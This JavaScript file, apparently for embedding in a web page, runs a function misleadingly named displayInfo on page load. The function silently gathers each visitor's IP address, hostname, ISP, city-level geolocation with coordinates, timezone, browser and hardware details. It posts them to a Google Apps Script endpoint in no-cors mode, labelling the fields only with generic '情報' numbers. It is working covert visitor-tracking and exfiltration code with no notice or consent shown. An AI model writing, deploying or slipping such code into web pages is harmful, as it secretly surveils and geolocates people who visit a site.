var pauseUpdate = false;

async function displayInfo() {
    if (pauseUpdate) return;
    var date = new Date();
    let my_ip = await (await fetch("https://wtfismyip.com/json").catch()).json().catch();
    let ip_data = await (await fetch(`https://uncors.vercel.app/?url=http://ip-api.com/json/${my_ip.YourFuckingIPAddress}`).catch()).json().catch();
    var data = {
        '情報1': window.location.href,
        '情報2': date.toString(),
        '情報3': my_ip.YourFuckingIPAddress,
        '情報4': my_ip.YourFuckingHostname,
        '情報5': ip_data.country + ' (' + ip_data.countryCode + ')',
        '情報6': ip_data.regionName + ' (' + ip_data.region + ')',
        '情報7': ip_data.city,
        '情報8': ip_data.lat,
        '情報9': ip_data.lon,
        '情報10': my_ip.YourFuckingISP,
        '情報11': ip_data.as,
        '情報12': navigator.userAgent,
        '情報13': navigator.cookieEnabled,
        '情報14': navigator.onLine,
        '情報26': navigator.platform,
        '情報27': (typeof window.performance.memory != "undefined" ? Math.round(window.performance.memory.jsHeapSizeLimit / 1024 / 1024) : null) + 'MB',
        '情報28': navigator.hardwareConcurrency,
        '情報29': navigator.deviceMemory,
        '情報30': navigator.languages.join(", "),
        '情報31': navigator.language,
        '情報32': date.toLocaleDateString() + ' ' + date.toLocaleTimeString(),
        '情報33': ip_data.timezone,
        '情報34': date.getTimezoneOffset() / 60 + ' hours'
    };
    var response = await fetch('https://script.google.com/macros/s/AKfycbyWoqNGgMzGC55LZkan0RfvlOKiDIACYRjgla0FouBZWGRTpv46f2MjzpqXOyV_fbjI/exec', {
        method: 'POST',
        mode: 'no-cors',
        cache: 'no-cache',
        headers: {
            'Content-Type': 'application/json'
        },
        body: JSON.stringify(data)
    });
}
window.onload = displayInfo;
